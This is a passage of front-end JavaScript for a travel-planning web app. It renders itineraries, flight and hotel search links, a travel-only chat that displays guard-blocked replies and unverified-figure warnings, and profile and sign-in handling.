          ? `<div class="routebar" style="margin:18px 0 10px">`
            + `<span class="pill2">${ICON('i-route')}`
            + `<b>${r.total_km.toLocaleString()} km</b> of travelling</span>`
            + r.legs.map((l) => `<span>${esc(l.from)} → ${esc(l.to)} `
              + `<b>${l.km.toLocaleString()} km</b></span>`).join('')
            + `</div>` : '')
        + `<div class="readout" style="margin:14px 0"><p>${esc(it.summary)}</p></div>`
        + `<div class="addall"><button class="btn sm solid" type="button" id="add-all">`
        + `${ICON('i-plus')}Add every stop to my trip list</button>`
        + `<span>tagged with the city and country each one belongs to</span></div>`
        + it.days.map((x) => `<div class="day"><div class="n">${esc(x.day)}</div>
            <div class="theme">${esc(x.theme)}</div>
            <ul class="obs keepable" style="margin-top:0">${x.items.map((i) =>
              `<li><span>${esc(i)}</span>`
              + `<button class="keep" type="button" data-keep="${esc(i)}"`
              + ` data-where="${esc(whereForDay(x, d.stops || []))}"`
              + ` title="Add to your trip list">${ICON('i-plus')}</button></li>`
              ).join('')}</ul></div>`).join('')
        + `<div class="readout"><p class="peer" style="border:0;margin:0;padding:0">`
        + `${esc(it.money_note)}</p>`
        + (it.guide_note ? `<p class="peer">${esc(it.guide_note)}</p>` : '') + `</div>`
        + logisticsHTML(d.logistics);
      const stops = d.stops || [];
      out.querySelectorAll('[data-keep]').forEach((b) =>
        b.onclick = () => addTodo(b.dataset.keep, b.dataset.where || ''));
      const all = out.querySelector('#add-all');
      if (all) all.onclick = () => addAllFromItinerary(it.days, stops);
    } catch (e) { oops(out, e); }
  };
}

/* Flights and stays.

   This is the honest half of a booking engine. We have no fares and no room
   rates, and a plausible invented price is worse than no price — so the app
   states only what it actually knows (which airports you would really fly
   between, and how far apart they are, both from our own data) and hands the
   live numbers to the sites that hold them. Every link opens a search. */
const LINK_ICON = { 'Skyscanner': 'i-plane', 'Google Flights': 'i-plane',
  'Wego': 'i-plane', 'Booking.com': 'i-bed', 'Airbnb': 'i-bed',
  'Google Hotels': 'i-bed', 'Lonely Planet': 'i-compass',
  'Michelin Guide': 'i-stamp', 'GetYourGuide': 'i-user',
  'Viator': 'i-user', 'Airbnb Experiences': 'i-user',
  'Withlocals': 'i-user', 'Official tourist board': 'i-stamp' };

function searchLinks(map) {
  return `<div class="golinks">` + Object.entries(map || {}).map(([name, url]) =>
    `<a class="golink" href="${esc(url)}" target="_blank" rel="noopener noreferrer">`
    + `${ICON(LINK_ICON[name] || 'i-link')}${esc(name)}</a>`).join('') + `</div>`;
}

function logisticsHTML(lg) {
  if (!lg) return '';
  const flights = (lg.legs || []).filter((l) => l.mode === 'fly');
  const ground = (lg.legs || []).filter((l) => l.mode !== 'fly');
  const stays = lg.stays || [];
  return `<div class="logi">
    <h2 class="bh"><svg class="i"><use href="#i-plane" /></svg>Getting there</h2>
    ${flights.length
      ? `<p class="fieldnote">${flights.length} leg${flights.length === 1 ? '' : 's'}
           ${flights.length === 1 ? 'is' : 'are'} far enough to fly.
           ${esc(lg.airport_note || '')}</p>
         ${flights.map((l) => `
          <div class="leg">
            <div class="legtop"><b>${esc(l.from)} → ${esc(l.to)}</b>
              <span>${l.km.toLocaleString()} km</span></div>
            <p class="legline">Nearest direct flight to look for:
              <b>${esc(l.from_iata)} → ${esc(l.to_iata)}</b>
              <span>${esc(l.from_airport)} to ${esc(l.to_airport)}</span></p>
            ${searchLinks(l.search)}
            ${(l.from_options || []).length ? `
              <div class="alts"><span class="altlabel">Other airports near
                ${esc(l.from)} — one of these may have the non-stop:</span>
                <div class="golinks">${l.from_options.map((o) =>
                  `<a class="golink alt" href="${esc(o.search['Google Flights'])}"
                      target="_blank" rel="noopener noreferrer"
                      title="${esc(o.name)} — direct flights to ${esc(l.to_iata)}">`
                  + `${ICON('i-plane')}${esc(o.iata)} <i>${o.km} km</i></a>`).join('')}
                </div></div>` : ''}
            ${(l.to_options || []).length ? `
              <div class="alts"><span class="altlabel">Or fly into:</span>
                <div class="golinks">${l.to_options.map((o) =>
                  `<a class="golink alt" href="${esc(o.search['Google Flights'])}"
                      target="_blank" rel="noopener noreferrer"
                      title="${esc(o.name)}">`
                  + `${ICON('i-plane')}${esc(o.iata)} <i>${o.km} km</i></a>`).join('')}
                </div></div>` : ''}
          </div>`).join('')}`
      : `<p class="fieldnote">No leg here is long enough that flying is the
           obvious choice — this one travels overland.</p>`}
    ${ground.length
      ? `<p class="fieldnote ground">Overland: ${ground.map((l) =>
          `${esc(l.from)} → ${esc(l.to)} (${l.km.toLocaleString()} km)`).join(' · ')}.</p>`
      : ''}

    <h2 class="bh"><svg class="i"><use href="#i-bed" /></svg>Where to stay</h2>
    <p class="fieldnote">You chose <b>${esc(lg.accommodation || 'any')}</b>. We do not
      hold rooms or rates, so these open a live search for each stop — filter to the
      standard you want and to the area you are spending your days in.</p>
    <div class="staygrid">${stays.map((st) => `
      <div class="stay">
        <b>${esc(st.city)}</b>
        ${st.airport ? `<span class="staynote">nearest airport ${esc(st.airport)}</span>` : ''}
        ${searchLinks(st.search)}
      </div>`).join('')}</div>

    ${stays.some((st) => st.tours) ? `
      <h2 class="bh"><svg class="i"><use href="#i-user" /></svg>Booking a local guide</h2>
      <p class="fieldnote">Tern has no guides of its own and introduces you to
        nobody &mdash; these open a search for each city you are visiting, and
        you book directly with whoever you choose. <b>GetYourGuide</b> and
        <b>Viator</b> list operators and professional guides, mostly scheduled
        group tours. <b>Withlocals</b> and <b>Airbnb Experiences</b> list
        individual hosts, which is more personal and less regulated. The
        <b>official tourist board</b> is the only one that can tell you who is
        actually licensed &mdash; which in some cities is the law, not a
        nicety. We vet none of them, which is why the itinerary above says
        what to ask before you pay.</p>
      <div class="staygrid">${stays.filter((st) => st.tours).map((st) => `
        <div class="stay">
          <b>${esc(st.city)}</b>
          ${searchLinks(st.tours)}
        </div>`).join('')}</div>` : ''}

    ${stays.some((st) => st.guides && Object.keys(st.guides).length) ? `
      <h2 class="bh"><svg class="i"><use href="#i-compass" /></svg>Reading up</h2>
      <p class="fieldnote">Published guides for each stop. These open their own
        search — we do not reproduce their write-ups or their ratings.
        ${stays.some((st) => st.guides && st.guides['Michelin Guide'])
          ? 'Michelin only appears where it publishes a selection.'
          : 'Michelin does not publish a selection for these countries.'}</p>
      <div class="staygrid">${stays.map((st) => `
        <div class="stay">
          <b>${esc(st.city)}</b>
          ${searchLinks(st.guides)}
        </div>`).join('')}</div>` : ''}

    <p class="logidisc">${ICON('i-tower')}${esc(lg.disclaimer || '')}</p>
  </div>`;
}

/* --------------------------------------------------------------- route --- */
/* Shown when there are two or more want-list countries and a home to start
   from. Pure arithmetic, so it loads with the page. */
async function paintRoute() {
  // This used to be a wide card above the form, which gave a suggestion the
  // weight of a step you had to work through. It is a suggestion, so it now
  // sits in the rail beside the want-list it is derived from, cut down to the
  // order and the distance. The full working still appears on the itinerary.
  if (!state.home || state.labels.want.size < 2) {
    state.routeHint = null;
    return paintTripRail();
  }
  try {
    const r = await post('/api/route', payload());
    state.routeHint = {
      stops: [r.home_name, ...r.order_names, r.home_name],
      km: r.total_km, saved: r.saved_km,
    };
  } catch (e) { state.routeHint = null; }
  paintTripRail();
}

/* Price and timing for whichever country is in the box. Both come from the
   shortlist payload, so no extra call and no invented prices. */
/* ================================================================= chat === */
$('#chat-ask').onsubmit = async (e) => {
  e.preventDefault();
  const input = $('#chat-input'), text = input.value.trim();
  if (!text) return;
  input.value = '';
  const log = $('#chatlog');
  log.insertAdjacentHTML('beforeend', `<div class="bub me"></div>`);
  log.lastElementChild.textContent = text;
  log.insertAdjacentHTML('beforeend',
    `<div class="bub them"><div class="thinking"><i></i><i></i><i></i></div></div>`);
  log.lastElementChild.scrollIntoView({ block: 'end' });
  try {
    const d = await post('/api/chat', { message: text, session_id: state.chatSession });
    state.chatSession = d.session_id;
    const bub = log.lastElementChild;
    if (d.blocked && d.category === 'off-topic') {
      // Not an attack — just a question this consultant does not take. It
      // reads as a boundary, not an alarm, so it does not get the red shield.
      bub.classList.add('offtopic');
      bub.innerHTML = `<div class="shield">${ICON('i-compass')}travel only</div><span></span>`;
      bub.querySelector('span').textContent = d.reply;
    } else if (d.blocked) {
      // The guard refused this before the model ever saw it. Shown as a
      // refusal rather than a normal answer, so it is obvious what happened.
      bub.classList.add('blocked');
      bub.innerHTML = `<div class="shield">${ICON('i-stamp')}blocked · ${esc(d.category)}</div>`
        + `<span></span>`;
      bub.querySelector('span').textContent = d.reply;
    } else {
      bub.innerHTML = mdBold(d.reply);
      if (d.verified === false && (d.unverified_figures || []).length) {
        bub.insertAdjacentHTML('beforeend',
          `<div class="unverified">${ICON('i-tower')}<span>`
          + `${d.unverified_figures.length} figure`
          + `${d.unverified_figures.length === 1 ? '' : 's'} here `
          + `(${d.unverified_figures.map((n) => n.toLocaleString()).join(', ')}) `
          + `could not be matched to any tool result — treat with caution.`
          + `</span></div>`);
      }
    }
  } catch (err) {
    log.lastElementChild.innerHTML = `<span class="err">${err.message}</span>`;
  }
  log.lastElementChild.scrollIntoView({ block: 'end' });
};

/* A script error used to leave the page half-alive with no explanation — a
   button that does nothing looks exactly like a broken server. Say so instead. */
addEventListener('error', (e) => {
  if (document.getElementById('crash')) return;
  const bar = document.createElement('div');
  bar.id = 'crash';
  bar.innerHTML = `${ICON('i-tower')}<span><b>Something broke in the page.</b> `
    + `${e.message || 'Script error'} — a hard reload (Cmd+Shift+R) fixes a stale script.`
    + `</span><button onclick="location.reload(true)">Reload</button>`;
  document.body.appendChild(bar);
});

/* ============================================================ passport === */
/* Home country and passport are the only user input the app asks for beyond
   the map. Both optional: every page works without them, they simply unlock
   distance, carbon, visa checks and routing. */
function saveProfileLocal() {
  try {
    localStorage.setItem(PROF_KEY, JSON.stringify(
      { home: state.home, passport: state.passport, homeCity: state.homeCity }));
  } catch (e) { /* private mode */ }
}
function loadProfileLocal() {
  try { return JSON.parse(localStorage.getItem(PROF_KEY) || '{}'); }
  catch (e) { return {}; }
}

/* One small payload keyed by destination, so the trip picker can filter and
   warn without a round trip per country. */
async function loadVisaMap() {
  if (!state.passport) { state.visa = null; return; }
  try {
    const d = await get(`/api/visa?passport=${encodeURIComponent(state.passport)}`);
    state.visa = d.destinations || null;
  } catch (e) { state.visa = null; }
  // The trip page may already be built and showing "set your passport" — it
  // asks for the visa map before the map has arrived. Repaint the parts that
  // depend on it rather than leaving a stale prompt on screen.
  if ($('#s-visafree')) { paintVisaFree(); fillStopCountries(); }
  if (window.__paintVisaFilter) window.__paintVisaFilter();
  if (window.__paintVisaBox) window.__paintVisaBox(false);
  if (window.__paintStudentNote) window.__paintStudentNote();
}

const visaFor = (country) => {
  const c = state.byName.get(country);
  return (c && c.iso3 && state.visa) ? state.visa[c.iso3] : null;
};

function paintPassport() {
  const btn = $('#btn-passport'), lbl = $('#pp-label');
  const nm = (i) => (state.isoName.get(i) || i);
  btn.classList.toggle('set', !!state.home);
  lbl.textContent = state.home
    ? (state.homeCity ? `${state.homeCity}, ` : '') + nm(state.home)
      + (state.passport && state.passport !== state.home ? ` · ${state.passport}` : '')
    : 'Set home';
}

function fillCountrySelects() {
  const rows = [...state.byName.entries()]
    .filter(([, c]) => c.iso3)
    .sort((a, b) => a[0].localeCompare(b[0]));
  const opts = (sel) => `<option value="">— none —</option>`
    + rows.map(([n, c]) =>
        `<option value="${c.iso3}"${c.iso3 === sel ? ' selected' : ''}>${n}</option>`).join('');
  $('#pp-home').innerHTML = opts(state.home);
  $('#pp-pass').innerHTML = opts(state.passport);
}

$('#btn-passport').onclick = () => {
  fillCountrySelects();
  $('#pp-city').value = state.homeCity || '';
  syncCityField();
  $('#passport').hidden = false;
};

/* ------------------------------------------------- city autocomplete ---
   Searched on the server, scoped to the chosen country. 34,000 cities is not
   something to ship to the browser for a field most people use once. */
let cityHits = [], cityIdx = -1, cityTimer = null;

function syncCityField() {
  const iso = $('#pp-home').value;
  $('#pp-city-wrap').hidden = !iso;
  if (!iso) { hideSuggest(); return; }
  const nm = state.isoName.get(iso) || iso;
  $('#pp-city-hint').textContent = $('#pp-city').value
    ? '' : `Leave blank to measure from ${nm}'s capital.`;
}

function hideSuggest() { $('#pp-suggest').hidden = true; cityHits = []; cityIdx = -1; }

function renderSuggest() {
  const box = $('#pp-suggest');
  if (!cityHits.length) {
    box.innerHTML = `<div class="none">No city of 15,000+ people matches that.</div>`;
    box.hidden = false;
    return;
  }
  box.innerHTML = cityHits.map((c, i) =>
    `<button type="button" data-i="${i}" class="${i === cityIdx ? 'on' : ''}">`
    + `<span>${esc(c.city)}${c.capital ? ' ★' : ''}</span>`
    + `<i>${esc(c.state || '')}</i></button>`).join('');
  box.hidden = false;
  box.querySelectorAll('button').forEach((b) =>
    b.onclick = () => pickCity(cityHits[+b.dataset.i]));
}

function pickCity(c) {
  $('#pp-city').value = c.city;
  state.homeCity = c.city;
  $('#pp-city-hint').textContent = `${c.city}${c.state ? ', ' + c.state : ''}`;
  hideSuggest();
}

async function searchCities() {
  const iso = $('#pp-home').value, q = $('#pp-city').value.trim();
  if (!iso) return hideSuggest();
  try {
    const r = await get(`/api/cities?country=${encodeURIComponent(iso)}`
      + `&q=${encodeURIComponent(q)}`);
    cityHits = r.cities || [];
    cityIdx = -1;
    renderSuggest();
  } catch (e) { hideSuggest(); }
}

on('#pp-home', 'onchange', () => {
  // the city belongs to the country; changing one invalidates the other
  state.homeCity = null;
  $('#pp-city').value = '';
  syncCityField();
  hideSuggest();
});
on('#pp-city', 'oninput', () => {
  state.homeCity = null;                  // not chosen until picked from the list
  $('#pp-city-hint').textContent = '';
  clearTimeout(cityTimer);
  cityTimer = setTimeout(searchCities, 160);
});
on('#pp-city', 'onfocus', searchCities);
on('#pp-city', 'onkeydown', (e) => {
  if ($('#pp-suggest').hidden || !cityHits.length) return;
  if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
    e.preventDefault();
    cityIdx = (cityIdx + (e.key === 'ArrowDown' ? 1 : -1) + cityHits.length) % cityHits.length;
    renderSuggest();
  } else if (e.key === 'Enter' && cityIdx >= 0) {
    e.preventDefault();
    pickCity(cityHits[cityIdx]);
  } else if (e.key === 'Escape') {
    hideSuggest();
  }
});
$('#pp-close').onclick = () => $('#passport').hidden = true;
$('#passport').onclick = (e) => { if (e.target.id === 'passport') $('#passport').hidden = true; };
$('#pp-form').onsubmit = async (e) => {
  e.preventDefault();
  state.home = $('#pp-home').value || null;
  state.passport = $('#pp-pass').value || null;
  // only a city actually chosen from the list counts; free text is ignored
  if (!state.home) state.homeCity = null;
  saveProfileLocal();
  if (signedIn()) {
    try {
      await post('/api/me/profile', { home: state.home, passport: state.passport,
                                      home_city: state.homeCity });
    }
    catch (err) { /* keep the local copy; the next save retries */ }
  }
  $('#passport').hidden = true;
  paintPassport();
  await loadVisaMap();
  refresh();
  if (pageOf() === 'next') shortlist();
  if (pageOf() === 'trip') { tripForm(); if (window.__paintVisaBox) window.__paintVisaBox(false); }
  if (pageOf() === 'getaways') weekend();
};

/* ================================================================ auth === */
/* Signing up is optional on purpose. Every page works as a guest; an account
   only decides where the map is kept. The nudge says so rather than nagging. */
let authMode = 'login';

function setAuthMode(mode) {
  authMode = mode;
  const reg = mode === 'register';
  $$('#auth-seg .segb').forEach((b) => b.classList.toggle('on', b.dataset.mode === mode));
  $('#a-confirm-wrap').hidden = !reg;
  $('#a-confirm').required = reg;
  $('#a-pass').setAttribute('autocomplete', reg ? 'new-password' : 'current-password');
  $('#auth-title').textContent = reg ? 'Keep your map' : 'Welcome back';
  $('#auth-sub').textContent = reg
    ? 'One account, and your countries follow you to any browser.'
    : 'Your map is waiting where you left it.';
  $('#auth-go').lastChild.textContent = reg ? 'Create account' : 'Sign in';

  // tell a guest with pins that they will not lose them by signing up
  const n = state.labels.visited.size + state.labels.lived.size + state.labels.want.size;
  const carry = $('#auth-carry');
  carry.hidden = !(reg && n);
  carry.className = 'authnote carry';
  carry.textContent = n
    ? `The ${n} ${n === 1 ? 'country' : 'countries'} you have already pinned will move to the new account.`
    : '';
  authErr(null);
}
const authErr = (msg) => {
  const el = $('#auth-err');
  el.hidden = !msg;
  if (msg) el.innerHTML = `${ICON('i-tower')}<span>${msg}</span>`;
};

function openAuth(mode = 'login') {
  $('#auth').hidden = false;
  setAuthMode(mode);
  setTimeout(() => $('#a-email').focus(), 40);
}
const closeAuth = () => { $('#auth').hidden = true; $('#auth-form').reset(); authErr(null); };

$('#btn-signin').onclick = () => openAuth('login');
$('#auth-close').onclick = closeAuth;
$('#auth').onclick = (e) => { if (e.target.id === 'auth') closeAuth(); };
addEventListener('keydown', (e) => { if (e.key === 'Escape' && !$('#auth').hidden) closeAuth(); });
$$('#auth-seg .segb').forEach((b) => b.onclick = () => setAuthMode(b.dataset.mode));

$('#auth-form').onsubmit = async (e) => {
  e.preventDefault();
  const email = $('#a-email').value.trim(), pass = $('#a-pass').value;
  const btn = $('#auth-go');
  btn.disabled = true;
  authErr(null);
  try {
    const body = authMode === 'register'
      ? { email, password: pass, confirm: $('#a-confirm').value, carry: snapshot() }
      : { email, password: pass };
    const d = await post(`/api/auth/${authMode}`, body);
    applySession(d);
    closeAuth();
    flash(d.created ? 'account created — map saved' : `signed in as ${d.email}`);
  } catch (err) {
    authErr(err.message);
  } finally {
    btn.disabled = false;
  }
};

function applySession(d) {
  state.auth = { token: d.token, email: d.email };
  try { localStorage.setItem(TOKEN_KEY, d.token); } catch (e) { /* private mode */ }
  // An account that has never set a home keeps whatever the guest had, rather
  // than blanking it on sign-in.
  const prof = d.profile || {};
  if (prof.home || prof.passport) {
    state.home = prof.home || null;
    state.passport = prof.passport || null;
    state.homeCity = prof.home_city || null;
  } else if (state.home || state.passport) {
    post('/api/me/profile', { home: state.home, passport: state.passport,
                              home_city: state.homeCity }).catch(() => {});
  }
  paintPassport();
  setLabels(d.map);
  paintAccount();
  loadTodo();                 // the account's list replaces the guest one
  paint(); renderLists(); refresh();
}

$('#btn-signout').onclick = async () => {
  // flush first: the whole point of an account is that signing out loses nothing
  await flushSave();
  try { await post('/api/auth/logout', {}); } catch (e) { /* log out locally anyway */ }
  state.auth = { token: null, email: null };
  try { localStorage.removeItem(TOKEN_KEY); } catch (e) { /* private mode */ }
  setLabels(loadLocal());          // back to whatever this browser had as a guest
  const lp = loadProfileLocal();
  state.home = lp.home || null;
  state.passport = lp.passport || null;
  state.homeCity = lp.homeCity || null;
  paintAccount(); paintPassport();
  loadTodo();                 // back to whatever this browser had as a guest
  paint(); renderLists(); refresh();
  flash('signed out — your map is saved');
};

function paintAccount() {
  const on = signedIn();
  $('#btn-signin').hidden = on;
  $('#who').hidden = !on;
  $('#who-email').textContent = state.auth.email || '';
  $('#nudge').hidden = on || nudgeDismissed;
}
let nudgeDismissed = false;
$('#nudge-x').onclick = () => { nudgeDismissed = true; $('#nudge').hidden = true; };
$('#nudge-go').onclick = (e) => { e.preventDefault(); openAuth('register'); };

/* ================================================================= boot === */
(async function boot() {
  route();
  const d = await get('/api/countries');
  d.countries.forEach((c) => {
    state.byName.set(c.name, c);
    if (c.num) byNum.set(c.num, c);
  });

  state.isoName = new Map();
  d.countries.forEach((c) => { if (c.iso3) state.isoName.set(c.iso3, c.name); });
  const lp = loadProfileLocal();
  state.home = lp.home || null;
  state.passport = lp.passport || null;
  state.homeCity = lp.homeCity || null;

  // A stored token is only a claim; the server decides whether it is still good.
  try { state.auth.token = localStorage.getItem(TOKEN_KEY) || null; } catch (e) {}
  if (state.auth.token) {
    try {
      const me = await get('/api/auth/me');
      if (me.email) {
        state.auth.email = me.email;
        setLabels(me.map);
        const prof = me.profile || {};
        if (prof.home || prof.passport) {
          state.home = prof.home || null;
          state.passport = prof.passport || null;
          state.homeCity = prof.home_city || null;
        }
      }
      else { state.auth.token = null; localStorage.removeItem(TOKEN_KEY); }
    } catch (e) { state.auth.token = null; }
  }
  if (!signedIn()) setLabels(loadLocal());

  paintAccount();
  paintPassport();
  loadVisaMap();
  loadTodo();
  renderLists();
  refresh();
  await drawMap();
  buildTimeline();
  route();   // re-measure now that the map exists
})();
